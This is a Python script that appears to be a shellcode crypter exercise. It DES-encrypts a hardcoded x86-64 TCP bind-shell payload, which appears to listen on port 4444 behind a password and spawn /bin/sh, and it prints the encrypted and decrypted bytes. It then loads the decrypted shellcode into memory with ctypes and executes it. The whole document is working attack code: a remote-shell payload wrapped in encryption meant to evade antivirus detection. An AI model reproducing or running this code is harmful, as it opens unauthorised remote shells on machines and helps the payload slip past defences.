from ctypes import *
from Crypto.Cipher import DES
from Crypto import Random

iv = Random.get_random_bytes(8)
des1 = DES.new('01234567', DES.MODE_CFB, iv)
des2 = DES.new('01234567', DES.MODE_CFB, iv)

#Shellcode Bind_shell_TCP
buf =  ""
buf += "\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc1"
buf += "\x03\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48"
buf += "\x97\x6a\x02\x66\xc7\x44\x24\x02\x11\x5c\x51\x59"
buf += "\x54\x5e\x52\x6a\x10\x5a\x4c\x01\xd1\x6a\x31\x58"
buf += "\x0f\x05\x5e\x6a\x32\x48\xf7\xd1\x58\x0f\x05\x6a"
buf += "\x2b\x58\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05"
buf += "\x49\x87\xf9\x48\x31\xf6\x6a\x03\x5e\xff\xce\xb0"
buf += "\x21\x0f\x05\x75\xf8\x54\x5e\x48\x31\xc0\x0f\x05"
buf += "\x68\x68\x61\x63\x6b\x58\x48\x8d\x3e\xaf\x31\xf6"
buf += "\x4d\x31\xff\x66\x41\xbf\x1f\x16\x66\x41\x81\xef"
buf += "\x10\x11\x41\x57\x49\x89\xe7\x48\xbf\xd0\x9d\x96"
buf += "\x91\xd0\x8c\x97\xff\x48\xff\xc7\x48\xf7\xdf\xf7"
buf += "\xe6\x04\x3b\x57\x54\x5f\x41\xff\xd7"
#Method to print our shellcode
def print_shellcode(shellcode):
        encoded = ""
        for x in bytearray(shellcode):
                value = x
                encoded += '\\x'
                encoded += '%02x' % value
        print (encoded)

#Encryption
encrypted_shellcode = des1.encrypt(buf)

#Encrypted Shellcode
print ("Encrypted shellcode ...")
print_shellcode(encrypted_shellcode)

#Decryption
decrypted = des2.decrypt(encrypted_shellcode)

#Decrypted Shellcode
print 'Decrypted shellcode ...'
print_shellcode(decrypted)

#Sending shellcode to stack and executing it
memorywithshell = create_string_buffer(decrypted, len(decrypted))
print (len(decrypted))
shellcode = cast(memorywithshell, CFUNCTYPE(c_void_p))

shellcode()

